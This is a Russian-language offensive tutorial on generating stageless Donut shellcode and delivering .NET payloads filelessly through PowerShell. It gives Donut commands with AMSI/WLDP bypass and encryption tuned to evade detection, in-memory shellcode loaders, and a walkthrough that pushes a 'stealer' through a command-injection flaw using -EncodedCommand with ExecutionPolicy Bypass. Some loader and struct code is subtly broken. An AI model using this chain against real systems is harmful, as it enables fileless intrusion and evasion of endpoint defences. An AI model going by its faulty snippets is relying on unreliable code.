# Генерация shellcode через donut для inline-доставки

## Контекст shellcode-нагрузок и место Donut в операциях начального доступа

Термин **shellcode** в контексте пентеста и offensive-разработки обозначает фрагмент машинного кода, предназначенный для выполнения после эксплуатации уязвимости. Исторически shellcode запускал командную оболочку (`/bin/sh` или `cmd.exe`), однако сегодня он чаще выступает первым звеном цепочки доставки — загружает и выполняет в памяти более сложные полезные нагрузки (meterpreter, beacon, произвольный .NET-сборщик). Ключевое требование к shellcode — отсутствие жёстких привязок к адресному пространству, то есть **позиционно-независимый код (PIC)**.

Традиционным инструментом генерации shellcode для пентестеров долгое время служил `msfvenom` из состава Metasploit Framework. Он способен создавать обфусцированные, кодированные и даже stageless-нагрузки, но его возможности ограничены теми модулями, которые уже встроены в фреймворк. Если атакующему требуется выполнить кастомное приложение (например, собственную .NET-сборку с функциями RAT, стилера или C2-агента), `msfvenom` не подходит — он не умеет «оборачивать» произвольные PE-файлы, DLL или скрипты в исполняемый shellcode.

Именно эту задачу решает **Donut** — open-source-утилита для генерации позиционно-независимого shellcode из VBScript, JScript, EXE, DLL и .NET-сборок ([GitHub](https://github.com/TheWover/donut)). Инструмент разработан TheWover и odzhan, впервые представлен в 2019 году и на текущий момент включён в дистрибутив [Kali Linux](https://www.kali.org/tools/donut-shellcode). Интеграция Donut в цепочку атаки позволяет атакующему взять любой готовый бинарник или .NET-сборку и упаковать её в автономный shellcode, пригодный для **inline-доставки** — прямого встраивания в скрипт, эксплойт или документ без внешних загрузок (stageless).

Inline-доставка (stageless) означает, что вся полезная нагрузка находится внутри самого shellcode. Donut поддерживает два режима:
- **Staged**: shellcode содержит только загрузчик, который по URL забирает зашифрованный модуль с сервера.
- **Stageless**: модуль (сборка или скрипт) встраивается непосредственно в shellcode на этапе генерации, и при выполнении распаковывается и запускается из памяти без дополнительных сетевых запросов.

Именно stageless‑режим обеспечивает автономность и совместимость с каналами доставки, где невозможно или нежелательно загружать дополнительный файл: командная инъекция, макросы Office, PowerShell‑однострочники, пейлоады в веб-эксплойтах.

Сравнительная таблица ниже фиксирует ключевые различия между Donut и другими подходами к генерации shellcode.

| Инструмент / подход | Входные форматы | Stageless-режим | Поддержка .NET | Дополнительные возможности |
|---------------------|-----------------|-----------------|----------------|---------------------------|
| `msfvenom` (Metasploit) | Встроенные модули (reverse shell, meterpreter, dllinject) | Да, через staged/stageless payloads | Нет (meterpreter — нативный код) | Кодирование, обфускация, шаблоны, шифрование AES |
| Donut | EXE, DLL, VBS, JS, .NET-сборки | Да (флаг отсутствия `-u`) | Полная поддержка через CLR-хостинг | Шифрование Chaskey, сжатие aPLib/LZNT1/Xpress, энтропия имён, обход AMSI/WLDP |
| Собственная реализация PIC‑загрузчика | Произвольный shellcode | Да, если код написан вручную | Сложно, требуется самостоятельная реализация CLR-хостинга | Максимальная кастомизация, минимальный размер |
| `sRDI` (Convert DLL to shellcode) | DLL | Да | Нет (только нативный код) | Преобразование DLL в позиционно‑независимый код |

Donut закрывает нишу превращения «любого исполняемого файла Windows в шелл-код», что особенно ценно при пост‑эксплуатации, когда атакующий располагает готовыми .NET‑имплантами (например, Cobalt Strike execute‑assembly, Pulsar RAT, кастомные стилеры) и нуждается в способе их бесфайловой доставки. В реальных атаках Donut неоднократно применялся: группировка Indrik Spider (Evil Corp) использовала его в кампаниях WastedLocker ([NCC Group](https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/)), вредоносная кампания PureLogs stealer задействовала Donut в цепочке ClickFix ([Gurucul](https://gurucul.com/blog/canndelta-clickfix-campaign-abusing-donut-shellcode-to-deploy-purelogs-stealer)), а Point Wild исследовали многостадийную атаку, где Donut‑shellcode внедрялся в svchost.exe и explorer.exe ([SOC Prime](https://socprime.com/active-threats/when-malware-strikes-back)). MITRE ATT&CK классифицирует Donut как инструмент S0695 и связывает его с техниками Reflective Code Loading (T1620), Process Injection (T1055), Obfuscated Files (T1027) и другими ([MITRE ATT&CK](https://attack.mitre.org/software/S0695)).

Базовый синтаксис Donut демонстрирует, насколько просто осуществить такую трансформацию:

```bash
donut -f Demo.exe -c Demo.Program -m Main
```

Команда генерирует файл `loader.bin` — stageless shellcode для 64‑разрядной архитектуры (по умолчанию `-a 3` — x86 и x64), содержащий зашифрованную сборку `Demo.exe` и точку входа `Demo.Program.Main`. Далее этот бинарный блоб можно интегрировать в сценарий атаки как inline‑нагрузку.

## Внутренняя архитектура Donut: от PE/сборки до позиционно‑независимого кода

Donut представляет собой не просто упаковщик, а сборочный конвейер, объединяющий три ключевых элемента: **загрузочный шелл‑код (payload.exe)**, **экземпляр конфигурации (Donut Instance)** и **модуль полезной нагрузки (Donut Module)**. Понимание этой архитектуры необходимо для эффективного использования инструмента и возможного написания собственных детектирующих правил.

ASCII‑схема иллюстрирует компоновку сгенерированного shellcode:

```text
+-----------------+------------------+----------------+
| Shellcode из    | Donut Instance   | Donut Module   |
| payload.exe     | (конфигурация)   | (зашифрованная |
| (.text segment) |                  | сборка/скрипт) |
+-----------------+------------------+----------------+
         │                  │                  │
         ▼                  ▼                  ▼
   Позиционно-         - архитектура       - сжатый и/или
   независимый код,    - режим обхода      зашифрованный
   разрешающий API,    - точка входа       полезный файл,
   загружающий CLR,    - флаги энтропии    (EXE/DLL/VBS/JS),
   разворачивающий     - размеры           параметры
   и вызывающий        компонентов         (до 32 символов)
   Module
```

**Shellcode (payload.exe).** Этот компонент представляет собой машинный код, извлечённый из `.text`-сегмента вспомогательного исполняемого файла `payload.exe` (в репозитории Donut). Он реализует всю логику загрузки: динамическое разрешение Windows API через хеши строк (ROR13), выделение памяти (VirtualAlloc/NtAllocateVirtualMemory), копирование и расшифрование модуля, при необходимости — загрузку CLR и создание AppDomain для .NET-сборок, вызов точки входа и последующее затирание следов в памяти. Код написан на ассемблере и C, полностью позиционно‑независим: все смещения вычисляются относительно текущего значения регистра EIP/RIP.

**Donut Instance** — бинарная структура фиксированного формата, следующая сразу за shellcode. Она содержит настройки, переданные через ключи командной строки: целевую архитектуру (`1` для x86, `2` для amd64, `3` для обоих), режим обхода AMSI/WLDP (`-b`), флаг вызова точки входа в новом потоке (`-t`), флаг завершения процесса через RtlExitUserProcess (`-x`) и т.д. Кроме того, здесь хранятся размеры и смещения последующих секций. Пример иллюстративной структуры (фактические поля могут варьироваться в разных версиях):

```c
// Структура Donut Instance (иллюстративная схема)
typedef struct _DONUT_INSTANCE {
    DWORD   dwLen           // размер структуры
    DWORD   dwType          // тип модуля (DONUT_MODULE_EXE=1, DLL=2, NET=3, VBS=4, JS=5)
    DWORD   dwArch          // 1=x86, 2=amd64, 3=both
    DWORD   dwBypass        // AMSI/WLDP bypass level
    DWORD   dwEntropy       // уровень энтропии
    CHAR    szModuleName[64]; // имя модуля (может быть случайным)
    // ... поля смещений до секций ...
} DONUT_INSTANCE, *PDONUT_INSTANCE;
```

**Donut Module** — основная полезная нагрузка. Для stageless‑режима она встраивается непосредственно в shellcode на этапе генерации. Модуль состоит из заголовка (`DONUT_MODULE`) и зашифрованных/сжатых данных исходного файла. По умолчанию (уровень энтропии 3) Donut применяет:
- сжатие библиотекой aPLib или LZNT1/Xpress через `RtlCompressBuffer` (уменьшает размер),
- шифрование блочным шифром **Chaskey** со случайным 128‑битным ключом.

Ключ шифрования генерируется случайно и сохраняется внутри Instance. После загрузки и выполнения модуля ссылки на исходный файл затираются (обнуляется память), чтобы усложнить форензику и работу memory scanner’ов.

Для .NET‑сборок Donut не просто отдаёт байты в память, а загружает их в новый **Application Domain** с использованием CLR‑хостинга. Это позволяет безопасно выгрузить сборку после завершения или в случае ошибки, а также обеспечивает изоляцию от основного процесса.

Алгоритм разрешения API использует хеширование имён функций и библиотек (ROR13) — типовой подход для снижения размера и избегания статического импорта, который мог бы сигнализировать о функциональности (например, наличие `VirtualAlloc` в IAT). Пример вычисления хеша и динамического поиска адреса можно проиллюстрировать следующим фрагментом дизассемблера (x64):

```asm
; фрагмент иллюстрирует поиск LoadLibraryA по хешу ROR13 (абстрактный псевдокод)
mov  eax, <хеш "LoadLibraryA">
call resolve_api
; resolve_api перебирает экспортные таблицы kernel32.dll, вычисляет хеш каждого имени и сравнивает
```

В результате shellcode способен выполняться в любом процессе Windows, не требуя предварительного знания базовых адресов и не оставляя статических индикаторов, кроме специфической последовательности, загружающей CLR. Именно эти особенности объясняют высокую популярность Donut и одновременно сложность его статического обнаружения.

## Практическая генерация и inline‑интеграция Donut shellcode

Рабочий цикл пентестера, задействующего Donut для inline‑доставки, состоит из трёх этапов: подготовка полезной нагрузки (компиляция .NET‑сборки), генерация stageless shellcode и внедрение полученного shellcode в вектор атаки (скрипт, шаблон эксплойта). Рассмотрим каждый этап с акцентом на особенности, позволяющие обходить защитные механизмы.

### Генерация stageless shellcode

Интерфейс командной строки Donut позволяет тонко настроить поведение как загрузчика, так и модуля. Базовый вызов для получения stageless‑нагрузки из .NET-EXE выглядит так:

```bash
donut -f Target.exe -c TargetNamespace.Class -m EntryMethod -p "arg1 arg2" -a 2 -b 3 -o payload.bin
```

Пояснение ключевых опций:
- `-f` — путь к исходному файлу (EXE, DLL, .NET-сборка, VBS, JS).
- `-c` — полное имя класса (для .NET DLL обязательно, для EXE можно не указывать, если точка входа стандартная Main).
- `-m` — имя метода (или API для DLL), который будет вызван после загрузки.
- `-p` — параметры, передаваемые методу, разделённые пробелами и заключённые в кавычки; каждый параметр ограничен длиной в 32 символа.
- `-a 2` — компиляция только под amd64 (для современных целей обычно достаточно).
- `-b 3` — политика обхода AMSI и WLDP: `1` — пропустить, `2` — прервать при ошибке, `3` — продолжить даже при неудаче обхода. Значение `3` гарантирует, что исполнение не остановится из-за технических сбоев пачтинга.
- `-o payload.bin` — имя выходного файла (по умолчанию `loader.bin`).
- Отсутствие ключа `-u` (URL) как раз активирует stageless‑режим — модуль встраивается в shellcode.

Для .NET DLL, которая не имеет точки входа `Main`, опция `-c` и `-m` обязательны. Например, сборка с пространством имён `Payload` и классом `Launcher`, содержащим метод `Execute`:

```bash
donut -f Launcher.dll -c Payload.Launcher -m Execute -p "target_ip" -a 2 -e 3 -o launcher.bin
```

Опция `-e` управляет уровнем энтропии: `3` включает генерацию случайных имён и симметричное шифрование Chaskey, что существенно затрудняет статическое сигнатурное обнаружение.

Вывод команды показывает стадии обработки и итоговый размер:

```
donut -f Launcher.dll -c Payload.Launcher -m Execute -p "10.0.0.1 4444" -a 2 -o launcher.bin
  [ Donut shellcode generator v1 (built ...) ]
  [ Copyright (c) 2019-2021 TheWover, Odzhan ]

  [ Instance type: DONUT_INSTANCE_NET
  [ Module file:   Launcher.dll
  [ Entropy:       3 (Random names + encryption)
  [ Output:        launcher.bin
  [ Loader size:   24576 bytes
  [ Done
```

Полученный `launcher.bin` — это самодостаточный бинарный блоб.

### Inline‑доставка через PowerShell

Наиболее распространённый сценарий inline‑доставки в Windows‑среде — PowerShell‑однострочник, передаваемый на целевую систему через командную инъекцию или другой удалённый вызов. PowerShell позволяет выделять память процесса с помощью `VirtualAlloc` и копировать туда массив байт, а затем вызывать shellcode как native-функцию.

Шаги преобразования shellcode в формат, удобный для PowerShell:
1. Прочитать содержимое `loader.bin` как массив байт.
2. Закодировать его в Base64 (уменьшает количество спецсимволов и упрощает встраивание в командную строку).

Пример на Kali Linux:

```bash
base64 -w0 loader.bin > loader.b64
```

Результат — одна длинная строка. Далее она вставляется в PowerShell‑скрипт, который выполняет типовые вызовы WinAPI:

```powershell
$bytes = [System.Convert]::FromBase64String("AQAA... (далее содержимое файла) ...")
$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  [Console]::GetType().GetMethod('Win32Method').Invoke($null, @('kernel32.dll','VirtualAlloc', ...))
  , [System.MulticastDelegate])
# Иллюстративная логика: $addr = $mem::Invoke(0, $bytes.Length, 0x3000, 0x40)
#                [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
#                $exec = Get-DelegateForFunctionPointer $addr @() ...
```

Но можно обойтись более компактным вариантом, задействующим готовые сниппеты из открытых источников, например, универсальный `Invoke-Shellcode.ps1` (часть PowerSploit) или самописный рефлективный загрузчик. В любом случае, ключевой момент: shellcode нигде не сохраняется на диске, а сразу попадает в память вызывающего процесса (или, при необходимости, внедряется в другой процесс, например `explorer.exe`).

### Обход AMSI и логирование

Сборки, сгенерированные Donut, по умолчанию (при `-b` > 1) производят патчинг Antimalware Scan Interface (AMSI) и Windows Lockdown Policy (WLDP) в контексте текущего процесса. Это достигается модификацией нескольких инструкций в `amsi.dll` и соответствующих API, что предотвращает проверку буферов PowerShell и других скриптовых интерпретаторов. В сочетании с шифрованием модуля Chaskey это позволяет payload’у оставаться незамеченным даже при включённом AMSI. Однако современные EDR могут отслеживать само действие патчинга, поэтому некоторые атакующие комбинируют Donut с кастомными downgrade‑атаками или отключают AMSI через отражение перед загрузкой shellcode.

### Упаковка и сжатие

Для снижения размера shellcode, что критично при передаче через ограниченные каналы (например, DNS‑туннели или макросы с жёстким лимитом), Donut поддерживает несколько алгоритмов сжатия. Включение сжатия происходит автоматически при использовании энтропии уровня 3, но при желании можно явно указать `-z` (api‑сжатие). Сжатый модуль дополнительно шифруется. Пример генерации сжатого stageless shellcode:

```bash
donut -f big_payload.dll -c Big.Payload -m Run -a 2 -e 3 -z -o small.bin
```

Размер итогового файла может уменьшиться на 30–50 % в зависимости от характера входной сборки.

Таким образом, практическая работа с Donut сводится к выбору между stageless и staged, настройке архитектуры и политики обхода, а затем интеграции полученного массива байт в скриптовый контейнер (PowerShell, Python, VBScript, HTA). Именно такую интеграцию мы детально проследим в следующем сквозном примере.

## Сквозной практический пример: доставка .NET‑стилера через PowerShell с помощью Donut

Рассмотрим реалистичный сценарий: пентестер разработал тестовый .NET‑стилер, собирающий системную информацию, и хочет доставить его на машину жертвы через уязвимость Command Injection в веб-приложении. Используется stageless Donut‑shellcode, который встраивается непосредственно в PowerShell‑команду.

### Исходные условия
- Атакующая машина: Kali Linux с установленным Donut (`apt install donut-shellcode`).
- Целевая машина: Windows 10 x64, PowerShell 5.1, доступен порт 80 для теста (или локально).
- Разработано простое .NET‑приложение на C#, сохраняемое в `InfoHarvester.cs`, которое собирает имя хоста, список процессов и записывает в файл `C:\temp\harvest.txt`.

### Шаг 1: Компиляция .NET‑сборки

Код сборки:

```csharp
using System;
using System.Diagnostics;
using System.IO;
namespace Harvester {
    public class Program {
        public static void Main() {
            string host = Environment.MachineName;
            var procs = Process.GetProcesses();
            string log = $"Host: {host}\n";
            foreach (var p in procs)
                log += $"{p.ProcessName}\n";
            File.WriteAllText(@"C:\temp\harvest.txt", log);
        }
    }
}
```

Компиляция через `csc.exe` (на Windows) или `mcs` (на Linux с mono):

```bash
mcs -out:InfoHarvester.exe InfoHarvester.cs
```

Получен `InfoHarvester.exe`.

### Шаг 2: Генерация stageless shellcode

На Kali выполняем:

```bash
donut -f InfoHarvester.exe -c Harvester.Program -m Main -a 2 -b 3 -o harvester.bin
```

Вывод:

```
  [ Donut shellcode generator v1 (built ...) ]
  [ Instance type: DONUT_INSTANCE_NET
  [ Module file:   InfoHarvester.exe
  [ Entropy:       3 (Random names + encryption)
  [ Output:        harvester.bin
  [ Loader size:   32256 bytes
  [ Done
```

Размер `harvester.bin` — около 32 КБ. Можно дополнительно сжать:

```bash
donut -f InfoHarvester.exe -c Harvester.Program -m Main -a 2 -b 3 -z -o harvester_compressed.bin
```

Для примера оставим без сжатия.

### Шаг 3: Кодирование shellcode в Base64 (для PowerShell)

В терминале:

```bash
base64 -w0 harvester.bin > harvester.b64
```

Содержимое `harvester.b64` — строка без переносов. Скопируем её в буфер.

### Шаг 4: Создание PowerShell‑скрипта для бесфайлового выполнения

Составим `invoke.ps1`, который принимает Base64‑строку, декодирует её и запускает через рефлективную загрузку (используем API вызовы напрямую):

```powershell
param([string]$EncShell)

$Bytes = [System.Convert]::FromBase64String($EncShell)
$Addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Addr, $Bytes.Length)

$VirtualProtect =@"
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
$ProtectType = Add-Type -MemberDefinition $VirtualProtect -Name "Win32Protect" -Namespace Win32ProtectFunctions -PassThru
$OldProtect = 0
$ProtectType::VirtualProtect($Addr, $Bytes.Length, 0x40, [ref]$OldProtect)

$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Addr, [Func[byte[]]])
$delegate.Invoke()
```

Примечание: приведённый код иллюстративный; в реальных сценариях используется проверенный шаблон, например, из `Invoke-Shellcode`.

### Шаг 5: Доставка и выполнение на целевой системе

На целевой Windows‑машине (или в тестовой среде) выполним PowerShell-команду, передающую Base64‑строку и запускающую скрипт. Предположим, мы получили Command Injection, позволяющий выполнить `powershell.exe -EncodedCommand <...>`. Приведём непосредственную команду для локального теста:

```powershell
powershell.exe -ExecutionPolicy Bypass -File invoke.ps1 -EncShell (Get-Content -Path harvester.b64 -Raw)
```

Либо сформировать закодированную команду, чтобы избежать внешнего файла:

```powershell
$base64Cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$Bytes = [System.Convert]::FromBase64String("' + (Get-Content harvester.b64 -Raw) + '"); $Addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Bytes.Length); [System.Runtime.InteropServices.Marshal]::Copy($Bytes,0,$Addr,$Bytes.Length); $ProtectType::VirtualProtect($Addr,$Bytes.Length,0x40,[ref]$OldProtect); $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Addr, [Func[byte[]]]); $delegate.Invoke()'))
# далее передаётся через -EncodedCommand
```

После выполнения на целевом компьютере появляется файл `C:\temp\harvest.txt` с результатами, а сборка никогда не записывалась на диск. Инструмент мониторинга, например, [Process Hacker](https://processhacker.sourceforge.io/), покажет загруженную CLR-сборку в памяти процесса PowerShell, но статический антивирус не обнаружит вредоносный EXE — его просто нет ни в одной файловой системе.

Таким образом, сквозной пример демонстрирует полный цикл: от произвольного .NET‑приложения до бесфайловой inline‑доставки с помощью Donut.

## Источники
- TheWover, odzhan. Donut — позиционно-независимый shellcode generator. GitHub. https://github.com/TheWover/donut
- Donut, Software S0695. MITRE ATT&CK. https://attack.mitre.org/software/S0695
- TheWover. Introducing Donut — Injecting .NET Assemblies as Shellcode. https://thewover.github.io/Introducing-Donut
- Kali Linux Tools — donut-shellcode. https://www.kali.org/tools/donut-shellcode
- Xavier Mertens. Do you Like Donuts? Here is a Donut Shellcode Delivered Through PowerShell/Python. SANS ISC. https://isc.sans.edu/diary/31182
- SOC Prime. When Malware Strikes Back (Donut shellcode powers in-memory RAT with Discord C2). https://socprime.com/active-threats/when-malware-strikes-back
- NCC Group. WastedLocker: a new ransomware variant developed by the Evil Corp group. https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/
- Gurucul. PureLogs Stealer via Donut Shellcode in ClickFix Attack. https://gurucul.com/blog/canndelta-clickfix-campaign-abusing-donut-shellcode-to-deploy-purelogs-stealer